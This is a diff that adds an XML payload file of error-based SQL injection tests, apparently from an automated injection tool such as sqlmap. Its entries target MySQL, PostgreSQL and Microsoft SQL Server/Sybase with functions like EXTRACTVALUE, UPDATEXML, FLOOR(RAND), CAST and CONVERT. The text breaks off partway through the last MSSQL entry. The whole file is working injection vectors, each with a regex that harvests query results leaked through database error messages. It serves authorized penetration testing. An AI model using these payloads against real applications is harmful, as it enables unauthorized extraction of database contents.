@@ -1,0 +1,1538 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<root>
+    <!-- Error-based tests - WHERE, HAVING, ORDER BY or GROUP BY clause -->
+    <test>
+        <title>MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</vector>
+        <request>
+            <!-- These work as good as ELT(), but are longer
+            <payload>AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
+            <payload>AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
+            -->
+            <payload>AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.5</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <!-- It does not work against ORDER BY or GROUP BY clause -->
+        <title>MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</vector>
+        <request>
+            <!-- These work as good as ELT(), but are longer
+            <payload>OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
+            <payload>OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
+            -->
+            <payload>OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.5</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))</vector>
+        <request>
+            <payload>AND EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.5</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>OR EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))</vector>
+        <request>
+            <payload>OR EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.5</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])</vector>
+        <request>
+            <payload>AND GTID_SUBSET(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM])</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.6</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>OR GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])</vector>
+        <request>
+            <payload>OR GTID_SUBSET(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM])</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.6</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8)))</vector>
+        <request>
+            <payload>AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.7.8</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <!-- It does not work against ORDER BY or GROUP BY clause -->
+        <title>MySQL &gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>3</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8)))</vector>
+        <request>
+            <payload>OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.7.8</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</vector>
+        <request>
+            <!-- These work as good as ELT(), but are longer
+            <payload>AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</payload>
+            <payload>AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</payload>
+            -->
+            <payload>AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>3</risk>
+        <clause>1,2,3,8,9</clause>
+        <!-- Despite this is an OR payload, keep where to 1 because otherwise it will not work when injecting in ORDER BY or GROUP BY -->
+        <where>1</where>
+        <vector>OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</vector>
+        <request>
+            <!-- These work as good as ELT(), but are longer
+            <payload>OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</payload>
+            <payload>OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</payload>
+            -->
+            <payload>OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0 (inline) error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>7</clause>
+        <where>1</where>
+        <vector>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</vector>
+        <request>
+            <payload>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</title>
+        <stype>2</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
+        <request>
+            <!-- These work as good as ELT(), but are longer
+            <payload>AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
+            <payload>AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
+            -->
+            <payload>AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</title>
+        <stype>2</stype>
+        <level>1</level>
+        <risk>3</risk>
+        <clause>1,2,3,8,9</clause>
+        <!-- Despite this is an OR payload, keep where to 1 because otherwise it will not work when injecting in ORDER BY or GROUP BY -->
+        <where>1</where>
+        <vector>OR EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
+        <request>
+            <!-- These work as good as ELT(), but are longer
+            <payload>OR EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
+            <payload>OR EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
+            -->
+            <payload>OR EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])</vector>
+        <request>
+            <!-- These work as good as ELT(), but are longer
+            <payload>AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'),[RANDNUM1])</payload>
+            <payload>AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])</payload>
+            -->
+            <payload>AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,2,3,8,9</clause>
+        <!-- Despite this is an OR payload, keep where to 1 because otherwise it will not work when injecting in ORDER BY or GROUP BY -->
+        <where>1</where>
+        <vector>OR UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])</vector>
+        <request>
+            <!-- These work as good as ELT(), but are longer
+            <payload>OR UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'),[RANDNUM1])</payload>
+            <payload>OR UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])</payload>
+            -->
+            <payload>OR UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)</vector>
+        <request>
+            <!-- These work as good as ELT(), but are longer
+            <payload>AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)</payload>
+            <payload>AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)</payload>
+            -->
+            <payload>AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 4.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <!-- It does not work against ORDER BY or GROUP BY clause -->
+        <title>MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)</vector>
+        <request>
+            <!-- These work as good as ELT(), but are longer
+            <payload>OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)</payload>
+            <payload>OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)</payload>
+            -->
+            <payload>OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 4.1</dbms_version>
+        </details>
+    </test>
+
+    <!-- This payload with AND does not work -->
+    <test>
+        <title>MySQL OR error-based - WHERE or HAVING clause (FLOOR)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1,8,9</clause>
+        <where>2</where>
+        <vector>OR 1 GROUP BY CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)</vector>
+        <request>
+            <payload>OR 1 GROUP BY CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL AND error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC)</vector>
+        <request>
+            <payload>AND [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL OR error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>1</level>
+        <risk>3</risk>
+        <clause>1,8,9</clause>
+        <where>2</where>
+        <vector>OR [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC)</vector>
+        <request>
+            <payload>OR [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)</title>
+        <stype>2</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM] IN (SELECT ('[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))</vector>
+        <request>
+            <payload>AND [RANDNUM] IN (SELECT ('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>3</risk>
+        <clause>1,8,9</clause>
+        <where>2</where>
+        <vector>OR [RANDNUM] IN (SELECT ('[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))</vector>
+        <request>
+            <payload>OR [RANDNUM] IN (SELECT ('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))</vector>
+        <request>
+            <payload>AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,8,9</clause>
+        <where>2</where>
+        <vector>OR [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))</vector>
+        <request>
+            <payload>OR [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>AND [RANDNUM]=CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)),'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
